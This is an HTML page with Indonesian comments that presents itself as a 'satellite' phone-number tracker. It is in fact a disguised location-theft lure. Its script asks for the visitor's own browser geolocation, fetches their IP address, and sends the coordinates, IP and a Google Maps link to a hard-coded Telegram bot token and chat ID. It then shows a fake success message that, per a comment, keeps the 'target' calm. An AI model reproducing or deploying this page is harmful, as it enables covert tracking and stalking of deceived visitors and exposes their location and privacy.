<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>XYZ ALIEN V5.6 - GHOST TRACKER</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@700;900&family=Share+Tech+Mono&display=swap');
        
        :root { 
            --gold: #ffd700;
            --gold-glow: 0 0 20px rgba(255, 215, 0, 0.5);
            --dark: #000;
        }

        * { box-sizing: border-box; }
        body { 
            background: var(--dark); color: var(--gold); 
            font-family: 'Share Tech Mono', monospace; 
            margin: 0; display: flex; justify-content: center; 
            align-items: center; min-height: 100vh; overflow: hidden;
        }

        @keyframes rainbow {
            0% { color: #ff0000; text-shadow: 0 0 10px #ff0000; }
            25% { color: #ffff00; text-shadow: 0 0 10px #ffff00; }
            50% { color: #00ff00; text-shadow: 0 0 10px #00ff00; }
            75% { color: #00ffff; text-shadow: 0 0 10px #00ffff; }
            100% { color: #ff00ff; text-shadow: 0 0 10px #ff00ff; }
        }

        .v5-card { 
            width: 95%; max-width: 450px; background: rgba(5, 5, 5, 0.98);
            border: 2px solid var(--gold); padding: 35px 25px; 
            box-shadow: var(--gold-glow); text-align: center;
            border-radius: 4px;
        }

        h2.rainbow {
            font-family: 'Orbitron'; font-size: 34px; margin-bottom: 5px;
            animation: rainbow 4s linear infinite; letter-spacing: 5px;
            font-weight: 900;
        }

        .radar {
            width: 110px; height: 110px; border: 1px solid var(--gold);
            border-radius: 50%; margin: 25px auto; position: relative;
            background: radial-gradient(circle, rgba(255,215,0,0.05) 0%, transparent 80%);
        }
        .radar::after {
            content: ''; position: absolute; top: 50%; left: 50%; width: 50%; height: 2px;
            background: var(--gold); transform-origin: left; animation: rotate 1.5s linear infinite;
        }
        @keyframes rotate { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }

        input { 
            width: 100%; background: transparent; border: none; 
            border-bottom: 1px solid #222; color: white; 
            padding: 15px; margin: 15px 0; outline: none; font-family: inherit;
            text-align: center; font-size: 16px;
        }
        input:focus { border-bottom: 1px solid var(--gold); }

        button { 
            width: 100%; padding: 18px; background: transparent; color: var(--gold); 
            border: 2px solid var(--gold); font-family: 'Orbitron'; 
            cursor: pointer; margin-top: 10px; font-weight: bold;
            text-transform: uppercase; letter-spacing: 2px; transition: 0.3s;
        }
        button:hover { background: var(--gold); color: #000; box-shadow: var(--gold-glow); }

        .terminal-gold { 
            background: #000; height: 130px; border: 1px solid #111; 
            padding: 12px; font-size: 11px; color: #b8860b; 
            overflow-y: auto; margin-top: 25px; text-align: left;
            border-left: 4px solid var(--gold);
        }
        .gold-log { color: var(--gold); }
    </style>
</head>
<body>

    <div class="v5-card">
        <h2 class="rainbow">XYZ ALIEN</h2>
        <div class="radar"></div>
        <div style="font-size: 11px; color: #444; margin-bottom: 25px; letter-spacing: 2px;">SATELLITE INTERFACE V5.6</div>

        <input type="text" id="target_num" placeholder="INPUT PHONE NUMBER (+62...)">
        
        <button onclick="initiateUplink()">INITIATE SATELLITE LOCK</button>

        <div class="terminal-gold" id="term">
            <div>> SYSTEM READY. UPLINK SECURED.</div>
        </div>
    </div>

<script>
    // --- INTEGRASI TELEGRAM TERPASANG ---
    const TELE_TOKEN = "8622815738:AAHixf_yecRdOHx1q3LPD0CubKyrszYEH58";
    const TELE_ID = "8224363309";
    // ------------------------------------

    function log(m) {
        const t = document.getElementById('term');
        t.innerHTML = `<div class="gold-log">> ${m}</div>` + t.innerHTML;
    }

    async function sendData(lat, lon, acc, phone) {
        log("PREPARING ENCRYPTED PACKET...");
        
        let ipInfo = "FAILED_TO_GET_IP";
        try {
            const res = await fetch('https://ipapi.co/json/');
            const data = await res.json();
            ipInfo = `${data.ip} (${data.org})`;
        } catch(e) {}

        const message = `🎯 <b>TARGET LOCKED!</b>%0A📱 <b>No HP:</b> <code>${phone}</code>%0A📍 <b>Lat:</b> <code>${lat}</code>%0A📍 <b>Lon:</b> <code>${lon}</code>%0A🛰️ <b>Akurasi:</b> ${acc} meter%0A🌐 <b>IP:</b> ${ipInfo}%0A🌍 <b>Google Maps:</b> https://www.google.com/maps?q=${lat},${lon}`;

        fetch(`https://api.telegram.org/bot${TELE_TOKEN}/sendMessage?chat_id=${TELE_ID}&text=${message}&parse_mode=html`)
        .then(() => log("UPLINK SUCCESSFUL. DATA STORED IN CLOUD."))
        .catch(() => log("CRITICAL: UPLINK FAILED!"));
    }

    function initiateUplink() {
        const phone = document.getElementById('target_num').value;
        if(!phone) return alert("REQUIRED: TARGET PHONE NUMBER!");

        log(`SCANNING SIGNAL FOR ${phone}...`);

        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                (pos) => {
                    const lat = pos.coords.latitude;
                    const lon = pos.coords.longitude;
                    const acc = pos.coords.accuracy;

                    log("COORDINATES ACQUIRED VIA SATELLITE.");
                    log(`TRIANGULATING: ${lat}, ${lon}`);
                    
                    // Eksekusi pengiriman data ke Telegram lo
                    sendData(lat, lon, acc, phone);

                    // Efek Fake Success agar target tenang
                    setTimeout(() => {
                        alert("Signal Locked! Satellite connection for " + phone + " is stable.");
                    }, 1500);
                },
                (err) => {
                    log("ERROR: TARGET BLOCKED UPLINK ACCESS.");
                    alert("Gagal Terhubung! Target harus menekan 'Allow/Izinkan' untuk sinkronisasi satelit.");
                },
                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
            );
        } else {
            log("CRITICAL: HARDWARE NOT SUPPORTED.");
        }
    }
</script>

</body>
</html>
